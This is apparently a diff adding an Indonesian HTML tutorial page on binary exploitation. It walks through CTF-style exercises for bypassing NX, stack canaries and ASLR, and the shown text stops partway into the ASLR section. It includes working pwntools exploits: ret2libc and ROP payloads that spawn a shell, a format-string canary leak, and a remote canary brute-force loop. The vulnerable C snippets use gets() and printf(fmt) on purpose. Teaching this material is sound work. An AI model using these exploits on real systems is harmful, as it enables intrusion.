@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;color:#1a1a1a;padding:1rem;background:#fff;max-width:720px;margin:0 auto}
+h2{font-size:17px;font-weight:500;margin-bottom:6px}
+h3{font-size:14px;font-weight:500;margin-bottom:6px}
+p{font-size:13px;line-height:1.75;color:#555}
+.nav{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1.25rem}
+.nav-btn{padding:6px 12px;border-radius:999px;border:0.5px solid #ccc;background:#fff;color:#555;font-size:11px;cursor:pointer;transition:all .15s}
+.nav-btn.active{background:#3C3489;color:#fff;border-color:#3C3489}
+.sec{display:none}.sec.active{display:block}
+.card{background:#fff;border:0.5px solid #ddd;border-radius:12px;padding:1rem 1.25rem;margin-bottom:.75rem}
+.soal-card{background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:12px;padding:1rem 1.25rem;margin-bottom:1.25rem}
+.step-nav{display:flex;align-items:center;gap:10px;margin-bottom:1rem}
+.step-dots{display:flex;gap:5px;flex:1;flex-wrap:wrap}
+.dot{width:9px;height:9px;border-radius:50%;background:#ccc;border:none;padding:0;cursor:pointer}
+.btn-nav{padding:6px 16px;border-radius:8px;border:0.5px solid #ccc;background:#fff;color:#1a1a1a;font-size:13px;cursor:pointer}
+.btn-nav:hover{background:#f5f5f5}
+.btn-next{background:#3C3489;color:#fff;border-color:#3C3489}
+.btn-next:hover{background:#26215C}
+.step-label{font-size:12px;color:#999}
+.step-panel{display:none}.step-panel.active{display:block}
+.eq{font-family:monospace;background:#f5f5f5;border:0.5px solid #ddd;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block}
+.eq-hi{font-family:monospace;background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#26215C}
+.eq-ok{font-family:monospace;background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#173404}
+.eq-danger{font-family:monospace;background:#FCEBEB;border:0.5px solid #F09595;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#501313}
+.ok{background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#27500A;margin:.4rem 0}
+.warn{background:#FAEEDA;border:0.5px solid #FAC775;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#633806;margin:.4rem 0}
+.danger{background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#791F1F;margin:.4rem 0}
+.note{background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#26215C;margin:.4rem 0}
+.step-title{font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:8px}
+.badge{display:inline-block;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:500;margin-bottom:8px;background:#EEEDFE;color:#3C3489}
+.tbl{width:100%;border-collapse:collapse;font-size:12px;margin:.5rem 0}
+.tbl th{font-weight:500;text-align:left;padding:6px 10px;background:#f5f5f5;border:0.5px solid #ddd;color:#555}
+.tbl td{padding:6px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px}
+.hi-row td{background:#FCEBEB;color:#791F1F}
+.ok-row td{background:#EAF3DE;color:#27500A}
+.warn-row td{background:#FAEEDA;color:#633806}
+.purple-row td{background:#EEEDFE;color:#3C3489}
+.big-ans{font-size:15px;font-weight:500;font-family:monospace;color:#534AB7}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:480px){.grid2{grid-template-columns:1fr}}
+.code-block{background:#1a1a2e;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:12px;color:#a8ff78;line-height:1.9;margin:.4rem 0;word-break:break-all}
+.cm{color:#555}.ck{color:#64b5f6}.cs{color:#ffd700}.cn{color:#f48fb1}
+.hi{background:#3d1a1a;color:#ff6b6b;border-radius:2px;padding:0 2px}
+.ok-hi{background:#1a3d1a;color:#a8ff78;border-radius:2px;padding:0 2px}
+.yl{color:#ffd700}.wh{color:#fff}
+.stack-cell{padding:5px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px;border-radius:4px;margin:2px 0;display:flex;justify-content:space-between;align-items:center}
+.sc-plain{background:#f5f5f5;color:#1a1a1a}
+.sc-canary{background:#FAEEDA;color:#633806;border-color:#FAC775;border-width:2px}
+.sc-ret{background:#FCEBEB;color:#791F1F;border-color:#F09595;border-width:2px}
+.sc-rop{background:#EEEDFE;color:#3C3489;border-color:#AFA9EC}
+.sc-ok{background:#EAF3DE;color:#27500A;border-color:#97C459}
+.addr{font-size:10px;color:#888;font-family:monospace}
+.prot-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:999px;font-size:11px;font-weight:500}
+.prot-on{background:#FCEBEB;color:#791F1F;border:0.5px solid #F09595}
+.prot-off{background:#EAF3DE;color:#27500A;border:0.5px solid #97C459}
+.step-box{padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #534AB7;border-radius:0 6px 6px 0;font-size:12px;margin:.3rem 0;line-height:1.8}
+</style>
+</head>
+<body>
+
+<div style="margin-bottom:1rem">
+  <div class="badge">Binary Exploitation — Bypassing Protection</div>
+  <h2>NX · Stack Canary · ASLR · PIE · RELRO</h2>
+  <p style="margin-top:4px">Proteksi-proteksi ini dirancang untuk menghentikan shellcode klasik. Tapi masing-masing punya kelemahan yang bisa di-bypass — sering dengan mengkombinasikan beberapa teknik sekaligus.</p>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showSec('overview')">Overview</button>
+  <button class="nav-btn" onclick="showSec('nx')">Bypass NX (ret2libc)</button>
+  <button class="nav-btn" onclick="showSec('canary')">Bypass Canary</button>
+  <button class="nav-btn" onclick="showSec('aslr')">Bypass ASLR</button>
+  <button class="nav-btn" onclick="showSec('pie')">Bypass PIE</button>
+  <button class="nav-btn" onclick="showSec('combined')">Soal Gabungan</button>
+</div>
+
+<!-- ============================================================ -->
+<!-- OVERVIEW -->
+<!-- ============================================================ -->
+<div id="sec-overview" class="sec active">
+  <div class="card">
+    <div class="step-title">Peta proteksi dan bypass-nya</div>
+    <h3>Lima proteksi utama dan cara mengatasinya</h3>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Proteksi</th><th>Cara kerja</th><th>Bypass teknik</th></tr>
+      <tr><td style="font-weight:500;color:#791F1F">NX / DEP</td><td>Stack tidak bisa dieksekusi</td><td>ret2libc, ROP chain</td></tr>
+      <tr><td style="font-weight:500;color:#791F1F">Stack Canary</td><td>Nilai rahasia sebelum ret addr</td><td>Leak canary, brute force (fork)</td></tr>
+      <tr><td style="font-weight:500;color:#791F1F">ASLR</td><td>Alamat stack/heap/libc acak</td><td>Leak address, brute force, relative offset</td></tr>
+      <tr><td style="font-weight:500;color:#791F1F">PIE</td><td>Alamat kode program acak</td><td>Leak binary base, partial overwrite</td></tr>
+      <tr><td style="font-weight:500;color:#791F1F">RELRO</td><td>GOT table read-only</td><td>Partial RELRO: overwrite GOT. Full RELRO: perlu teknik lain</td></tr>
+    </table>
+    <div class="note">Di CTF dan ujian, soal biasanya menyebutkan mana proteksi yang aktif. Kamu harus tahu bypass masing-masing. Kombinasi paling umum: NX + Canary + ASLR + PIE (semua aktif).</div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Cara cek proteksi yang aktif</div>
+    <h3>Tools yang dipakai</h3>
+    <div class="code-block">
+<span class="cm"># Cek dengan checksec (pwntools):</span>
+$ checksec --file=./vuln
+
+Arch:     i386-32-little
+RELRO:    <span class="hi">Partial RELRO</span>
+Stack:    <span class="hi">No canary found</span>
+NX:       <span class="hi">NX disabled</span>
+PIE:      <span class="hi">No PIE</span>
+
+<span class="cm"># Atau dengan pwntools di Python:</span>
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+e = ELF(<span class="cs">'./vuln'</span>)
+print(e.checksec())
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- NX BYPASS -->
+<!-- ============================================================ -->
+<div id="sec-nx" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 1 — Bypass NX dengan ret2libc</div>
+  <h2 style="color:#26215C">Stack tidak executable — gunakan fungsi libc!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">NX aktif: stack tidak bisa dieksekusi. Tapi kita masih bisa overflow dan overwrite return address — cukup arahkan ke <code>system()</code> di libc, bukan ke shellcode di stack!</p>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #AFA9EC;margin-bottom:.5rem">
+    <div style="color:#888;margin-bottom:4px">Info program:</div>
+    <div>Buffer size  = 64 byte, offset ke ret addr = 72 byte</div>
+    <div>NX: <span style="color:#791F1F">ENABLED</span> | Canary: OFF | ASLR: OFF | PIE: OFF</div>
+    <div style="margin-top:6px;color:#888">Alamat dari libc (ASLR off, statis):</div>
+    <div>system()     = <span style="color:#27500A">0xb7e52070</span></div>
+    <div>exit()       = <span style="color:#27500A">0xb7e45f10</span></div>
+    <div>"/bin/sh"    = <span style="color:#27500A">0xb7f6d4af</span> (string di libc)</div>
+  </div>
+  <p style="color:#3C3489;font-size:12px">Susun payload ret2libc untuk eksekusi <code>system("/bin/sh")</code>!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="nx-prev" onclick="prevStep('nx')" disabled>Prev</button>
+  <div class="step-dots" id="nx-dots"></div>
+  <span class="step-label" id="nx-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="nx-next" onclick="nextStep('nx')">Next</button>
+</div>
+
+<!-- NX STEP 0 -->
+<div class="step-panel active" id="nx-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Mengapa shellcode gagal dengan NX</div>
+    <h3>NX menandai stack sebagai non-executable</h3>
+    <p style="margin-bottom:.75rem">Dulu: kita tulis shellcode ke stack, loncat ke sana → CPU eksekusi. Sekarang dengan NX:</p>
+    <div class="code-block">
+<span class="cm"># Tanpa NX: CPU eksekusi byte di stack — berhasil</span>
+Stack: [shellcode bytes] ← CPU bisa eksekusi ini
+
+<span class="cm"># Dengan NX: CPU TIDAK bisa eksekusi dari stack</span>
+Stack: [shellcode bytes] ← <span class="hi">SEGFAULT! Permission denied</span>
+<span class="cm"># OS menandai halaman stack sebagai R/W tapi NOT execute</span>
+    </div>
+    <div class="danger">Shellcode di stack tidak bisa dijalankan. Tapi... kita masih bisa loncat ke kode yang SUDAH ADA di memori — seperti fungsi di libc!</div>
+    <div class="ok" style="margin-top:.4rem">Ide ret2libc: loncat ke <code>system()</code> yang sudah ada di libc, dengan argumen <code>"/bin/sh"</code> yang juga sudah ada di libc!</div>
+  </div>
+</div>
+
+<!-- NX STEP 1 -->
+<div class="step-panel" id="nx-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Konsep ret2libc</div>
+    <h3>Struktur calling convention x86 (32-bit)</h3>
+    <p style="margin-bottom:.75rem">Di x86 32-bit, saat fungsi dipanggil dengan <code>call func</code>:</p>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-plain"><span>arg1 ("/bin/sh" addr)</span><span class="addr">esp+8</span></div>
+      <div class="stack-cell sc-plain"><span>fake return address (exit())</span><span class="addr">esp+4</span></div>
+      <div class="stack-cell sc-rop"><span>→ system() address (overwrite ret addr ke sini)</span><span class="addr">esp+0</span></div>
+    </div>
+    <p style="font-size:12px;margin:.5rem 0">Ketika CPU "memanggil" system() via ret, ia mengharapkan stack layout seperti di atas. Kita bisa <strong>fake</strong> stack layout ini melalui overflow!</p>
+    <span class="eq">Payload ret2libc:
+[PADDING 72 byte][addr system()][addr exit()][addr "/bin/sh"]</span>
+    <div class="note">exit() dipakai sebagai "return address dari system()" supaya program tidak crash setelah shell ditutup. Bisa juga diisi 4 byte junk kalau tidak peduli crash.</div>
+  </div>
+</div>
+
+<!-- NX STEP 2 -->
+<div class="step-panel" id="nx-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Hitung struktur payload</div>
+    <h3>Susun payload dengan tiga alamat</h3>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Komponen</th><th>Isi</th><th>Ukuran</th></tr>
+      <tr class="warn-row"><td>Padding</td><td>'A' × 72</td><td>72 byte</td></tr>
+      <tr class="purple-row"><td>addr system()</td><td>0xb7e52070 → LE</td><td>4 byte</td></tr>
+      <tr class="ok-row"><td>addr exit()</td><td>0xb7e45f10 → LE</td><td>4 byte</td></tr>
+      <tr class="ok-row"><td>addr "/bin/sh"</td><td>0xb7f6d4af → LE</td><td>4 byte</td></tr>
+      <tr><td><strong>Total</strong></td><td></td><td><strong>84 byte</strong></td></tr>
+    </table>
+    <p style="font-size:12px">Konversi ke little-endian:</p>
+    <span class="eq">system() = 0xb7e52070 → \x70\x20\xe5\xb7
+exit()   = 0xb7e45f10 → \x10\x5f\xe4\xb7
+"/bin/sh"= 0xb7f6d4af → \xaf\xd4\xf6\xb7</span>
+  </div>
+</div>
+
+<!-- NX STEP 3 -->
+<div class="step-panel" id="nx-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Payload lengkap ret2libc</div>
+    <h3>Gabungkan semua komponen</h3>
+    <div class="code-block">
+<span class="cm"># ret2libc payload (84 byte):</span>
+
+<span class="cm"># Padding 72 byte</span>
+<span class="yl">b'A' * 72</span>
+
+<span class="cm"># Overwrite return address → system()</span>
+<span class="yl">\x70\x20\xe5\xb7</span>   <span class="cm"># 0xb7e52070 (little-endian)</span>
+
+<span class="cm"># "Return address" dari system() → exit()</span>
+<span class="yl">\x10\x5f\xe4\xb7</span>   <span class="cm"># 0xb7e45f10 (little-endian)</span>
+
+<span class="cm"># Argument 1 untuk system() → "/bin/sh"</span>
+<span class="yl">\xaf\xd4\xf6\xb7</span>   <span class="cm"># 0xb7f6d4af (little-endian)</span>
+
+<span class="cm"># Python pwntools:</span>
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+p = process(<span class="cs">'./vuln'</span>)
+payload  = b<span class="cs">'A'</span> * <span class="cn">72</span>
+payload += p32(<span class="cn">0xb7e52070</span>)  <span class="cm"># system()</span>
+payload += p32(<span class="cn">0xb7e45f10</span>)  <span class="cm"># exit()</span>
+payload += p32(<span class="cn">0xb7f6d4af</span>)  <span class="cm"># "/bin/sh"</span>
+p.sendline(payload)
+p.interactive()
+    </div>
+    <div class="ok" style="margin-top:.5rem">Tanpa satu byte shellcode pun — hanya alamat fungsi yang sudah ada di memori!</div>
+  </div>
+</div>
+
+<!-- NX STEP 4 -->
+<div class="step-panel" id="nx-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — ROP (Return Oriented Programming) untuk kasus lebih complex</div>
+    <h3>Kalau satu gadget tidak cukup — rantai gadget ROP</h3>
+    <p style="margin-bottom:.75rem">Untuk 64-bit atau kondisi lebih kompleks, kita perlu <strong>ROP gadget</strong> — potongan instruksi yang diakhiri <code>ret</code>.</p>
+    <div class="code-block">
+<span class="cm"># x86-64 calling convention: argumen lewat register (rdi, rsi, rdx)</span>
+<span class="cm"># Untuk system("/bin/sh"), butuh: rdi = addr "/bin/sh"</span>
+<span class="cm"># Cari gadget: "pop rdi; ret" di binary atau libc</span>
+
+<span class="cm"># ROP chain 64-bit:</span>
+payload  = b<span class="cs">'A'</span> * offset
+payload += p64(pop_rdi_ret)     <span class="cm"># gadget: pop rdi; ret</span>
+payload += p64(binsh_addr)      <span class="cm"># nilai yang masuk ke rdi</span>
+payload += p64(system_addr)     <span class="cm"># panggil system()</span>
+payload += p64(exit_addr)
+    </div>
+    <div class="note">ROPgadget atau ropper dipakai untuk cari gadget. Konsep kunci: kita "rantai" gadget kecil untuk setup register sebelum memanggil fungsi.</div>
+  </div>
+</div>
+
+<!-- NX STEP 5 -->
+<div class="step-panel" id="nx-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Ringkasan Bypass NX</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Payload ret2libc</div>
+      <div class="big-ans">Padding(72) + system() + exit() + "/bin/sh"</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan Bypass NX</p>
+      <p style="font-size:12px">NX: stack tidak executable → tidak bisa taruh shellcode di stack</p>
+      <p style="font-size:12px">Bypass: ret2libc — loncat ke system() yang sudah di memori</p>
+      <p style="font-size:12px">x86: [padding][system()][exit()]["/bin/sh"]</p>
+      <p style="font-size:12px">x64: [padding][pop rdi;ret]["/bin/sh"][system()][exit()]</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">Catatan: ret2libc mudah di-bypass, tapi kalau ASLR aktif, alamat libc berubah tiap run!</p>
+    </div>
+  </div>
+</div>
+</div><!-- end nx -->
+
+<!-- ============================================================ -->
+<!-- CANARY BYPASS -->
+<!-- ============================================================ -->
+<div id="sec-canary" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 2 — Bypass Stack Canary</div>
+  <h2 style="color:#26215C">Baca nilai canary dulu, lalu overflow!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">Canary aktif: nilai rahasia ditempatkan sebelum return address, kalau berubah program abort. Tapi program ini punya format string bug yang bisa dipakai untuk <strong>leak</strong> nilai canary!</p>
+  <div class="code-block">
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">32</span>];
+    <span class="ck">char</span> fmt[<span class="cn">64</span>];
+    printf(<span class="cs">"Name: "</span>);
+    fgets(fmt, <span class="cn">64</span>, stdin);
+    printf(fmt);           <span class="cm">// ← format string bug! leak stack</span>
+    printf(<span class="cs">"Input: "</span>);
+    gets(buf);             <span class="cm">// ← buffer overflow</span>
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #AFA9EC;margin-top:.5rem">
+    <div>Canary ada di offset ke-11 dari stack saat printf dipanggil</div>
+    <div>Offset ret addr dari buf: 40 byte (32 buf + 4 canary + 4 EBP)</div>
+    <div>Proteksi: <span style="color:#791F1F">Canary ON</span> | NX: OFF | ASLR: OFF</div>
+    <div>Target: ret addr di <span style="color:#27500A">0x08048400</span> (win function)</div>
+  </div>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="ca-prev" onclick="prevStep('ca')" disabled>Prev</button>
+  <div class="step-dots" id="ca-dots"></div>
+  <span class="step-label" id="ca-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="ca-next" onclick="nextStep('ca')">Next</button>
+</div>
+
+<!-- CA STEP 0 -->
+<div class="step-panel active" id="ca-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Cara kerja stack canary</div>
+    <h3>Canary = nilai rahasia yang dijaga sebelum return address</h3>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-ret"><span>RETURN ADDRESS</span><span class="addr">+40</span></div>
+      <div class="stack-cell sc-plain"><span>saved EBP</span><span class="addr">+36</span></div>
+      <div class="stack-cell sc-canary"><span>CANARY VALUE (misal: 0xdeadbeef)</span><span class="addr">+32</span></div>
+      <div class="stack-cell sc-ok"><span>buf[0..31] — 32 byte buffer</span><span class="addr">+0</span></div>
+    </div>
+    <p style="font-size:12px;margin:.5rem 0">Setelah fungsi selesai, compiler tambahkan kode cek:</p>
+    <div class="code-block">
+<span class="cm">; Kode yang compiler tambahkan di epilog fungsi:</span>
+mov  eax, [ebp-4]        <span class="cm">; baca canary dari stack</span>
+xor  eax, gs:0x14        <span class="cm">; XOR dengan canary asli di TLS</span>
+jne  __stack_chk_fail    <span class="cm">; kalau beda → ABORT!</span>
+    </div>
+    <div class="danger">Kalau overflow menimpa canary, program abort sebelum sempat sampai ke return address. Overflow biasa gagal.</div>
+  </div>
+</div>
+
+<!-- CA STEP 1 -->
+<div class="step-panel" id="ca-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Leak canary via format string</div>
+    <h3>printf(fmt) tanpa format spec → baca isi stack!</h3>
+    <p style="margin-bottom:.75rem">Format string <code>%p</code>, <code>%x</code>, <code>%s</code> membaca argumen dari stack. Kalau tidak ada argumen, ia membaca nilai stack berikutnya — termasuk canary!</p>
+    <div class="code-block">
+<span class="cm"># Kirim sebagai input "Name":</span>
+%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+
+<span class="cm"># Output yang mungkin:</span>
+<span class="wh">0x1.(nil).0x804a000.0x1.0x1.0xbffff4a0.
+0xbffff5b8.0x8048591.0x1.(nil).<span class="ok-hi">0xdeadbe00</span></span>
+
+<span class="cm"># Nilai ke-11 = CANARY!</span>
+<span class="cm"># (posisi canary diketahui dari soal: offset ke-11)</span>
+    </div>
+    <div class="note">Canary Linux selalu diakhiri dengan <code>\x00</code> (null byte) untuk mencegah string leak — tapi kita bisa baca dengan <code>%p</code> yang tidak stop di null!</div>
+    <div class="ok" style="margin-top:.4rem">Dengan <code>%11$p</code> (direct parameter access), kita langsung baca parameter ke-11 tanpa print yang lain.</div>
+  </div>
+</div>
+
+<!-- CA STEP 2 -->
+<div class="step-panel" id="ca-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Parse nilai canary dari output</div>
+    <h3>Ekstrak canary value dari respons server</h3>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+p = process(<span class="cs">'./vuln'</span>)
+
+<span class="cm"># Step 1: Kirim format string untuk leak canary</span>
+p.recvuntil(<span class="cs">b'Name: '</span>)
+p.sendline(<span class="cs">b'%11$p'</span>)         <span class="cm"># baca param ke-11 langsung</span>
+
+<span class="cm"># Step 2: Baca respons dan parse canary</span>
+output = p.recvline()
+canary = int(output.strip(), <span class="cn">16</span>)
+print(<span class="cs">f"Canary: {hex(canary)}"</span>)
+<span class="cm"># → Canary: 0xdeadbe00</span>
+    </div>
+    <div class="ok">Kita sekarang tahu nilai canary persis. Sekarang bisa overflow dengan memasukkan canary yang benar!</div>
+  </div>
+</div>
+
+<!-- CA STEP 3 -->
+<div class="step-panel" id="ca-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Susun payload dengan canary yang benar</div>
+    <h3>Overflow tapi canary tidak berubah → cek canary lolos!</h3>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-rop"><span>TARGET ADDR 0x08048400 (win func)</span><span class="addr">+40</span></div>
+      <div class="stack-cell sc-plain"><span>BBBB (fake EBP)</span><span class="addr">+36</span></div>
+      <div class="stack-cell sc-canary"><span>CANARY ASLI 0xdeadbe00 ← dipertahankan!</span><span class="addr">+32</span></div>
+      <div class="stack-cell sc-ok"><span>'A' × 32 (isi buffer)</span><span class="addr">+0</span></div>
+    </div>
+    <div class="code-block">
+<span class="cm"># Step 3: Susun payload dengan canary yang sudah diketahui</span>
+p.recvuntil(<span class="cs">b'Input: '</span>)
+
+payload  = b<span class="cs">'A'</span> * <span class="cn">32</span>           <span class="cm"># isi buffer</span>
+payload += p32(canary)          <span class="cm"># canary ASLI — tidak berubah!</span>
+payload += b<span class="cs">'B'</span> * <span class="cn">4</span>            <span class="cm"># fake EBP</span>
+payload += p32(<span class="cn">0x08048400</span>)    <span class="cm"># target/win function</span>
+
+p.sendline(payload)
+p.interactive()
+    </div>
+    <span class="eq-ok">Canary check: baca canary dari stack → sama dengan asli → LANJUT
+Program return ke 0x08048400 → win() dieksekusi! ✓</span>
+  </div>
+</div>
+
+<!-- CA STEP 4 -->
+<div class="step-panel" id="ca-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Teknik bypass canary lain: brute force di fork()</div>
+    <h3>Server yang pakai fork() → canary sama di tiap child!</h3>
+    <p style="margin-bottom:.75rem">Server daemon yang pakai <code>fork()</code> untuk tiap koneksi punya celah: proses child mewarisi nilai canary dari parent. Canary tidak berubah antar koneksi!</p>
+    <div class="code-block">
+<span class="cm"># Strategi brute force canary di fork server:</span>
+<span class="cm"># Canary 4 byte = 4 × 256 = 1024 kemungkinan (byte pertama selalu \x00)</span>
+<span class="cm"># Brute force byte per byte:</span>
+
+canary = <span class="cs">b'\x00'</span>              <span class="cm"># byte 1 selalu \x00</span>
+
+<span class="ck">for</span> b2 <span class="ck">in</span> range(<span class="cn">256</span>):         <span class="cm"># byte 2: 256 kemungkinan</span>
+    payload = <span class="cs">b'A'</span>*<span class="cn">32</span> + canary + bytes([b2]) + <span class="cs">b'\x00\x00'</span>
+    p = remote(host, port)
+    p.send(payload)
+    <span class="ck">if</span> <span class="cs">b'crash'</span> <span class="ck">not in</span> p.recv(): <span class="cm"># tidak crash = byte benar</span>
+        canary += bytes([b2])
+        <span class="ck">break</span>
+    </div>
+    <div class="note">Total brute force: 3 × 256 = 768 request (byte 1 selalu \x00). Sangat feasible untuk server fork!</div>
+  </div>
+</div>
+
+<!-- CA STEP 5 -->
+<div class="step-panel" id="ca-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Ringkasan Bypass Canary</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Payload dengan canary leak</div>
+      <div class="big-ans">'A'×32 + canary + 'B'×4 + target_addr</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan Bypass Canary</p>
+      <p style="font-size:12px">Canary: nilai rahasia di stack sebelum ret addr — kalau berubah → abort</p>
+      <p style="font-size:12px">Bypass 1: Leak via format string → tulis kembali nilai aslinya</p>
+      <p style="font-size:12px">Bypass 2: Brute force byte-per-byte di server fork()</p>
+      <p style="font-size:12px">Payload: [buf fill][CANARY asli][fake EBP][target addr]</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">Urutan di stack: buf → canary → EBP → ret addr (HARUS urut!)</p>
+    </div>
+  </div>
+</div>
+</div><!-- end canary -->
+
+<!-- ============================================================ -->
+<!-- ASLR BYPASS -->
+<!-- ============================================================ -->
+<div id="sec-aslr" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 3 — Bypass ASLR</div>
+  <h2 style="color:#26215C">Alamat berubah tiap run — tapi ada yang bocor!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">ASLR mengacak base address stack, heap, dan libc setiap eksekusi. Tapi program ini mencetak alamat sebuah variabel lokal — dan dari situ kita bisa hitung semua alamat lain!</p>
+  <div class="code-block">
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">64</span>];
+    printf(<span class="cs">"buf is at: %p\n"</span>, buf);  <span class="cm">// ← leak alamat stack!</span>
+    gets(buf);
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #AFA9EC;margin-top:.5rem">
+    <div>Offset buf ke shellcode: <span style="color:#27500A">0 byte</span> (shellcode di awal buf)</div>
+    <div>Offset buf ke ret addr: <span style="color:#791F1F">72 byte</span></div>
+    <div>Proteksi: ASLR: <span style="color:#791F1F">ON</span> | NX: OFF | Canary: OFF | PIE: OFF</div>
+    <div style="margin-top:4px">Contoh output: <span style="color:#D85A30">buf is at: 0xbf92f3c0</span> (berubah tiap run!)</div>
+  </div>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="as-prev" onclick="prevStep('as')" disabled>Prev</button>
+  <div class="step-dots" id="as-dots"></div>
+  <span class="step-label" id="as-counter">1 / 5</span>
+  <button class="btn-nav btn-next" id="as-next" onclick="nextStep('as')">Next</button>
+</div>
+
+<!-- AS STEP 0 -->
+<div class="step-panel active" id="as-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Cara kerja ASLR</div>
+    <h3>Setiap run, base address berubah secara acak</h3>
+    <div class="code-block">
+<span class="cm"># Tanpa ASLR: alamat selalu sama</span>
+Run 1: buf at 0xbffff4a0, libc at 0xb7e00000
+Run 2: buf at 0xbffff4a0, libc at 0xb7e00000  <span class="cm">← sama!</span>
+
+<span class="cm"># Dengan ASLR: base address berubah tiap run</span>
+Run 1: buf at 0xbf92f3c0, libc at 0xb75a1000
+Run 2: buf at 0xbfa8c240, libc at 0xb7612000  <span class="cm">← berbeda!</span>
+Run 3: buf at 0xbfc01550, libc at 0xb7489000
+    </div>
+    <div class="danger">Kita tidak bisa hardcode alamat — setiap run berbeda. Tapi: kalau program membocorkan SATU alamat, kita bisa hitung alamat lain karena <strong>OFFSET</strong> antar komponen selalu tetap!</div>
+  </div>
+</div>
+
+<!-- AS STEP 1 -->
+<div class="step-panel" id="as-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Konsep relative offset</div>
+    <h3>Offset antar alamat selalu konstan meski base berubah</h3>
